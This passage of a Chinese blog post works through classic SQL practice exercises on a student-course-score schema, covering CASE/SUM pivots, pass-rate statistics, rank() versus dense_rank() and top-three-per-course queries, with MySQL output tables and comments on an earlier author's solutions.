cid = <span class="number">01</span></span><br><span class="line">  <span class="keyword">and</span> score &lt; <span class="number">60</span></span><br><span class="line">  <span class="keyword">and</span> s.sid=sc.sid</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+-------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">| score |</span></span><br><span class="line">+------+--------+---------------------+------+-------+</span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|  50.0 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|  31.0 |</span></span><br><span class="line">+------+--------+---------------------+------+-------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>13. 按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sid</span>,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">01</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_01,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">02</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_02,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">03</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_03,</span><br><span class="line">    <span class="keyword">avg</span>(score)</span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">avg</span>(score) <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------+----------+----------+----------+------------+</span><br><span class="line"><span class="params">| sid  |</span> score_01 <span class="params">| score_02 |</span> score_03 <span class="params">| avg(score) |</span></span><br><span class="line">+------+----------+----------+----------+------------+</span><br><span class="line"><span class="params">| 07   |</span>     NULL <span class="params">|     89.0 |</span>     <span class="number">98.0</span> <span class="params">|   93.50000 |</span></span><br><span class="line"><span class="params">| 01   |</span>     <span class="number">80.0</span> <span class="params">|     90.0 |</span>     <span class="number">99.0</span> <span class="params">|   89.66667 |</span></span><br><span class="line"><span class="params">| 05   |</span>     <span class="number">76.0</span> <span class="params">|     87.0 |</span>     NULL <span class="params">|   81.50000 |</span></span><br><span class="line"><span class="params">| 03   |</span>     <span class="number">80.0</span> <span class="params">|     80.0 |</span>     <span class="number">80.0</span> <span class="params">|   80.00000 |</span></span><br><span class="line"><span class="params">| 02   |</span>     <span class="number">70.0</span> <span class="params">|     60.0 |</span>     <span class="number">80.0</span> <span class="params">|   70.00000 |</span></span><br><span class="line"><span class="params">| 04   |</span>     <span class="number">50.0</span> <span class="params">|     30.0 |</span>     <span class="number">20.0</span> <span class="params">|   33.33333 |</span></span><br><span class="line"><span class="params">| 06   |</span>     <span class="number">31.0</span> <span class="params">|     NULL |</span>     <span class="number">34.0</span> <span class="params">|   32.50000 |</span></span><br><span class="line">+------+----------+----------+----------+------------+</span><br><span class="line"><span class="number">7</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>14. 查询各科成绩最高分、最低分和平均分，以如下形式显示：课程 ID，课程 name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率(及格为&gt;=60，中等为：70-80，优良为：80-90，优秀为：&gt;=90）。<br> 要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列</strong></p><p>这道题熟练掌握case和sum的用法就没什么问题</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">c</span>.cid <span class="keyword">as</span> 课程号, <span class="built_in">c</span>.cname <span class="keyword">as</span> 课程名称, <span class="built_in">count</span>(*) <span class="keyword">as</span> 选修人数,</span><br><span class="line">    <span class="built_in">max</span>(score) <span class="keyword">as</span> 最高分, <span class="built_in">min</span>(score) <span class="keyword">as</span> 最低分, avg(score) <span class="keyword">as</span> 平均分,</span><br><span class="line">    sum(<span class="keyword">case</span> when score &gt;= <span class="number">60</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end)/<span class="built_in">count</span>(*) <span class="keyword">as</span> 及格率,</span><br><span class="line">    sum(<span class="keyword">case</span> when score &gt;= <span class="number">70</span> and score &lt; <span class="number">80</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end)/<span class="built_in">count</span>(*) <span class="keyword">as</span> 中等率,</span><br><span class="line">    sum(<span class="keyword">case</span> when score &gt;= <span class="number">80</span> and score &lt; <span class="number">90</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end)/<span class="built_in">count</span>(*) <span class="keyword">as</span> 优良率,</span><br><span class="line">    sum(<span class="keyword">case</span> when score &gt;= <span class="number">90</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end)/<span class="built_in">count</span>(*) <span class="keyword">as</span> 优秀率</span><br><span class="line">from sc, course <span class="built_in">c</span></span><br><span class="line"><span class="keyword">where</span> <span class="built_in">c</span>.cid = sc.cid</span><br><span class="line">group by <span class="built_in">c</span>.cid</span><br><span class="line">order by <span class="built_in">count</span>(*) desc, <span class="built_in">c</span>.cid asc</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-----------+--------------+--------------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+</span><br><span class="line"><span class="params">| 课程号    |</span> 课程名称      <span class="params">| 选修人数      |</span> 最高分     <span class="params">| 最低分    |</span> 平均分     <span class="params">| 及格率    |</span> 中等率    <span class="params">| 优良率     |</span> 优秀率     <span class="params">|</span></span><br><span class="line"><span class="params">+-----------+--------------+--------------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>        <span class="params">| 语文         |</span>            <span class="number">6</span> <span class="params">|      80.0 |</span>      <span class="number">31.0</span> <span class="params">|  64.50000 |</span>    <span class="number">0</span>.<span class="number">6667</span> <span class="params">|    0.3333 |</span>    <span class="number">0</span>.<span class="number">3333</span> <span class="params">|    0.0000 |</span></span><br><span class="line"><span class="params">| 02        |</span> 数学         <span class="params">|            6 |</span>      <span class="number">90.0</span> <span class="params">|      30.0 |</span>  <span class="number">72.66667</span> <span class="params">|    0.8333 |</span>    <span class="number">0</span>.<span class="number">0000</span> <span class="params">|    0.5000 |</span>    <span class="number">0</span>.<span class="number">1667</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>        <span class="params">| 英语         |</span>            <span class="number">6</span> <span class="params">|      99.0 |</span>      <span class="number">20.0</span> <span class="params">|  68.50000 |</span>    <span class="number">0</span>.<span class="number">6667</span> <span class="params">|    0.0000 |</span>    <span class="number">0</span>.<span class="number">3333</span> <span class="params">|    0.3333 |</span></span><br><span class="line">+-----------+--------------+--------------+-----------+-----------+-----------+-----------+-----------+-----------+-----------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p>原作者的写法本质上和我是相同的，但是用了很多left join看起来有些冗余</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> A.Cid,Cname,最高分,最低分,平均分,及格率,中等率,优良率,优秀率 <span class="keyword">from</span> SC A</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> Course <span class="keyword">on</span> A.Cid=Course.Cid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> Cid,<span class="keyword">MAX</span>(score)最高分,<span class="keyword">MIN</span>(score)最低分,<span class="keyword">AVG</span>(score)平均分 <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cid)B <span class="keyword">on</span> A.Cid=B.Cid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> Cid,(<span class="keyword">convert</span>(<span class="built_in">decimal</span>(<span class="number">5</span>,<span class="number">2</span>),(<span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score&gt;=<span class="number">60</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)*<span class="number">1.00</span>)/<span class="keyword">COUNT</span>(*))*<span class="number">100</span>)及格率 <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cid)C <span class="keyword">on</span> A.Cid=C.Cid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> Cid,(<span class="keyword">convert</span>(<span class="built_in">decimal</span>(<span class="number">5</span>,<span class="number">2</span>),(<span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;=<span class="number">70</span> <span class="keyword">and</span> score&lt;<span class="number">80</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)*<span class="number">1.00</span>)/<span class="keyword">COUNT</span>(*))*<span class="number">100</span>)中等率 <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cid)D <span class="keyword">on</span> A.Cid=D.Cid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> Cid,(<span class="keyword">convert</span>(<span class="built_in">decimal</span>(<span class="number">5</span>,<span class="number">2</span>),(<span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;=<span class="number">80</span> <span class="keyword">and</span> score&lt;<span class="number">90</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)*<span class="number">1.00</span>)/<span class="keyword">COUNT</span>(*))*<span class="number">100</span>)优良率 <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cid)E <span class="keyword">on</span> A.Cid=E.Cid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> Cid,(<span class="keyword">convert</span>(<span class="built_in">decimal</span>(<span class="number">5</span>,<span class="number">2</span>),(<span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;=<span class="number">90</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)*<span class="number">1.00</span>)/<span class="keyword">COUNT</span>(*))*<span class="number">100</span>)优秀率</span><br><span class="line"><span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cid)F <span class="keyword">on</span> A.Cid=F.Cid</span><br></pre></td></tr></table></figure><p><strong>15. 按平均成绩进行排序，显示总排名和各科排名，Score 重复时保留名次空缺</strong></p><p>原题目是按各科成绩进行排序，并显示排名， Score 重复时保留名次空缺。但是我没看明白什么意思，各科成绩如何排序？语文分数和数学分数有可比性吗？作者的写法是<code>select *,RANK()over(order by score desc)排名 from SC</code>，把所有的成绩都放到一块儿排序了，这没有意义，不可比。于是我修改了一下题目。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.*, rank_01, rank_02, rank_03, rank_total</span><br><span class="line"><span class="keyword">from</span> student s</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_01 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">01</span>) A <span class="keyword">on</span> s.sid=A.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_02 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">02</span>) B <span class="keyword">on</span> s.sid=B.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_03 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">03</span>) C <span class="keyword">on</span> s.sid=C.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">avg</span>(score) <span class="keyword">desc</span>) <span class="keyword">as</span> rank_total <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span>) D <span class="keyword">on</span> s.sid=D.sid</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rank_total <span class="keyword">asc</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+---------+---------+---------+------------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">| rank_01 |</span> rank_02 <span class="params">| rank_03 |</span> rank_total <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+---------+---------+---------+------------+</span></span><br><span class="line"><span class="params">|</span> 08   <span class="params">| 王菊   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span>    NULL <span class="params">|    NULL |</span>    NULL <span class="params">|       NULL |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">| 1989-07-01 00:00:00 |</span> 女   <span class="params">|    NULL |</span>       <span class="number">2</span> <span class="params">|       2 |</span>          <span class="number">1</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">1</span> <span class="params">|       1 |</span>       <span class="number">1</span> <span class="params">|          2 |</span></span><br><span class="line"><span class="params">| 05   |</span> 周梅   <span class="params">| 1991-12-01 00:00:00 |</span> 女   <span class="params">|       3 |</span>       <span class="number">3</span> <span class="params">|    NULL |</span>          <span class="number">3</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">1</span> <span class="params">|       4 |</span>       <span class="number">3</span> <span class="params">|          4 |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|       4 |</span>       <span class="number">5</span> <span class="params">|       3 |</span>          <span class="number">5</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">5</span> <span class="params">|       6 |</span>       <span class="number">6</span> <span class="params">|          6 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|       6 |</span>    NULL <span class="params">|       5 |</span>          <span class="number">7</span> <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+---------+---------+---------+------------+</span></span><br><span class="line"><span class="params">8 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>15.1 按平均成绩进行排序，显示总排名和各科排名，Score 重复时合并名次</strong></p><p>同样修改了一下题目。15题和15.1题的指向很明确了，就是rank()和dense_rank()的区别，也就是两个并列第一名之后的那个人是第三名(rank)还是第二名(dense_rank)的区别。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.*, rank_01, rank_02, rank_03, rank_total</span><br><span class="line"><span class="keyword">from</span> student s</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">dense_rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_01 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">01</span>) A <span class="keyword">on</span> s.sid=A.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">dense_rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_02 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">02</span>) B <span class="keyword">on</span> s.sid=B.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">dense_rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> rank_03 <span class="keyword">from</span> sc <span class="keyword">where</span> cid=<span class="number">03</span>) C <span class="keyword">on</span> s.sid=C.sid</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">sid</span>, <span class="keyword">dense_rank</span>() <span class="keyword">over</span>(<span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">avg</span>(score) <span class="keyword">desc</span>) <span class="keyword">as</span> rank_total <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span>) D <span class="keyword">on</span> s.sid=D.sid</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rank_total <span class="keyword">asc</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+---------+---------+---------+------------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">| rank_01 |</span> rank_02 <span class="params">| rank_03 |</span> rank_total <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+---------+---------+---------+------------+</span></span><br><span class="line"><span class="params">|</span> 08   <span class="params">| 王菊   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span>    NULL <span class="params">|    NULL |</span>    NULL <span class="params">|       NULL |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">| 1989-07-01 00:00:00 |</span> 女   <span class="params">|    NULL |</span>       <span class="number">2</span> <span class="params">|       2 |</span>          <span class="number">1</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">1</span> <span class="params">|       1 |</span>       <span class="number">1</span> <span class="params">|          2 |</span></span><br><span class="line"><span class="params">| 05   |</span> 周梅   <span class="params">| 1991-12-01 00:00:00 |</span> 女   <span class="params">|       2 |</span>       <span class="number">3</span> <span class="params">|    NULL |</span>          <span class="number">3</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">1</span> <span class="params">|       4 |</span>       <span class="number">3</span> <span class="params">|          4 |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|       3 |</span>       <span class="number">5</span> <span class="params">|       3 |</span>          <span class="number">5</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span>       <span class="number">4</span> <span class="params">|       6 |</span>       <span class="number">5</span> <span class="params">|          6 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|       5 |</span>    NULL <span class="params">|       4 |</span>          <span class="number">7</span> <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+---------+---------+---------+------------+</span></span><br><span class="line"><span class="params">8 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>17. 统计各科成绩各分数段人数：课程编号，课程名称，[100-85]，[85-70]，[70-60]，[60-0] 及所占百分比</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c.cid <span class="keyword">as</span> 课程编号, c.cname <span class="keyword">as</span> 课程名称, A.*</span><br><span class="line"><span class="keyword">from</span> course <span class="keyword">as</span> c,</span><br><span class="line">(<span class="keyword">select</span> cid,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;= <span class="number">85</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)/<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="number">100</span>_85,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;= <span class="number">70</span> <span class="keyword">and</span> score &lt; <span class="number">85</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)/<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="number">85</span>_70,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &gt;= <span class="number">60</span> <span class="keyword">and</span> score &lt; <span class="number">70</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)/<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="number">70</span>_60,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> score &lt; <span class="number">60</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)/<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="number">60</span>_0</span><br><span class="line"><span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> cid) <span class="keyword">as</span> A</span><br><span class="line"><span class="keyword">where</span> c.cid = A.cid</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+--------------+--------------+------+--------+--------+--------+--------+</span><br><span class="line"><span class="params">| 课程编号     |</span> 课程名称      <span class="params">| cid  |</span> <span class="number">100_85</span> <span class="params">| 85_70  |</span> <span class="number">70_60</span>  <span class="params">| 60_0   |</span></span><br><span class="line">+--------------+--------------+------+--------+--------+--------+--------+</span><br><span class="line"><span class="params">| 01           |</span> 语文         <span class="params">| 01   |</span> <span class="number">0</span>.<span class="number">0000</span> <span class="params">| 0.6667 |</span> <span class="number">0</span>.<span class="number">0000</span> <span class="params">| 0.3333 |</span></span><br><span class="line"><span class="params">| 02           |</span> 数学         <span class="params">| 02   |</span> <span class="number">0</span>.<span class="number">5000</span> <span class="params">| 0.1667 |</span> <span class="number">0</span>.<span class="number">1667</span> <span class="params">| 0.1667 |</span></span><br><span class="line"><span class="params">| 03           |</span> 英语         <span class="params">| 03   |</span> <span class="number">0</span>.<span class="number">3333</span> <span class="params">| 0.3333 |</span> <span class="number">0</span>.<span class="number">0000</span> <span class="params">| 0.3333 |</span></span><br><span class="line">+--------------+--------------+------+--------+--------+--------+--------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>18. 查询各科成绩前三名的记录</strong></p><p>这是我比较喜欢的一道题目，非常经典。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> *, <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> cid <span class="keyword">order</span> <span class="keyword">by</span> score <span class="keyword">desc</span>) <span class="keyword">as</span> graderank <span class="keyword">from</span> sc) A </span><br><span class="line"><span class="keyword">where</span> A.graderank &lt;= <span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">| Sid  |</span> Cid  <span class="params">| score |</span> graderank <span class="params">|</span></span><br><span class="line"><span class="params">+------+------+-------+-----------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span> 